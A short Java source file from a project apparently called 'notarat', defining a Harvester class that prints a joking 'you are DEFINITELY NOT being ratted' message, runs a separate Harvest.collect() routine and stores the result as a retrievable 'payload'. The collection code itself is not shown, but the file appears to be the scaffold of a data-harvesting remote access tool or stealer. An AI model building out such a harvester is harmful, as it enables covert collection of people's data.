package dev.xotic.notarat;

import dev.xotic.notarat.harvest.Harvest;

public final class Harvester {

    private static volatile String payload = "{}";
    private static volatile boolean busy   = false;

    public static void startScan() {
        System.err.println("watch out bro, you are DEFINITELY NOT being ratted *ଘ( ॢᵕ꒶̮ᵕ(꒡ᵋ ꒡ღ)zZ‥");

        busy = true;
        try {
            payload = Harvest.collect();
        } finally {
            busy = false;
        }
    }

    public static String getPayload() {
        return payload;
    }

    public static boolean isBusy() {
        return busy;
    }

    private Harvester() {}
}